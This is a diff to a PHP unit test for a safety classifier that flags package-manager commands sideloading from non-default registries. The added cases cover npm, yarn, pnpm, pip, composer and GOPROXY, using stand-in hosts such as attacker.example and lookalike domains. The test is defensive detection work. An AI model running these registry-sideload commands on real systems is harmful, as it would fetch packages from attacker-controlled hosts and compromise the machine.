@@ -128,6 +128,31 @@ final class SafetyClassifierPatternTableTest extends TestCase
         // `\b` on `go`.
         yield 'cargo install @latest' => ['cargo install foo@latest', null];
         yield 'go install @latest' => ['go install golang.org/x/tools/gopls@latest', 'package-registry-sideload'];
+        yield 'npm evil registry' => ['npm install evil --registry=https://attacker.example', 'package-registry-sideload'];
+        yield 'npm evil registry space' => ['npm i evil --registry https://attacker.example/', 'package-registry-sideload'];
+        yield 'npm lookalike host' => ['npm i x --registry=https://registry.npmjs.org.evil.com', 'package-registry-sideload'];
+        yield 'npm userinfo host' => ['npm i x --registry=https://registry.npmjs.org@evil.com', 'package-registry-sideload'];
+        yield 'npm default registry' => ['npm install lodash --registry=https://registry.npmjs.org', null];
+        yield 'npm default registry slash' => ['npm install lodash --registry https://registry.npmjs.org/', null];
+        yield 'npm ignore-scripts' => ['npm install --ignore-scripts', null];
+        yield 'yarn ignore-scripts' => ['yarn add left-pad --ignore-scripts', null];
+        yield 'yarn evil registry' => ['yarn add x --registry https://evil.example', 'package-registry-sideload'];
+        yield 'pnpm evil registry' => ['pnpm add x --registry=http://evil.example', 'package-registry-sideload'];
+        yield 'npm config set evil' => ['npm config set registry https://evil.example', 'package-registry-sideload'];
+        yield 'yarn config set evil' => ['yarn config set npmRegistryServer https://evil.example', 'package-registry-sideload'];
+        yield 'npm config set default' => ['npm config set registry https://registry.npmjs.org', null];
+        yield 'pip evil index' => ['pip install x --index-url https://evil.example/simple', 'package-registry-sideload'];
+        yield 'pip -i evil' => ['pip3 install x -i https://evil.example/simple', 'package-registry-sideload'];
+        yield 'pip extra evil' => ['python3 -m pip install x --extra-index-url=https://evil.example', 'package-registry-sideload'];
+        yield 'pip default index' => ['pip install x --index-url https://pypi.org/simple', null];
+        yield 'pip plain' => ['pip install requests', null];
+        yield 'composer evil repository' => ['composer require x --repository https://evil.example', 'package-registry-sideload'];
+        yield 'composer default repository' => ['composer require x --repository https://packagist.org', null];
+        yield 'composer config repositories' => ['composer config repositories.evil composer https://evil.example', 'package-registry-sideload'];
+        yield 'GOPROXY evil' => ['GOPROXY=https://evil.example go get x', 'package-registry-sideload'];
+        yield 'go env -w GOPROXY evil' => ['go env -w GOPROXY=https://evil.example', 'package-registry-sideload'];
+        yield 'GOPROXY default' => ['GOPROXY=https://proxy.golang.org,direct go build', null];
+        yield 'GOPROXY off' => ['GOPROXY=off go build', null];
     }
 
     #[DataProvider('commands')]
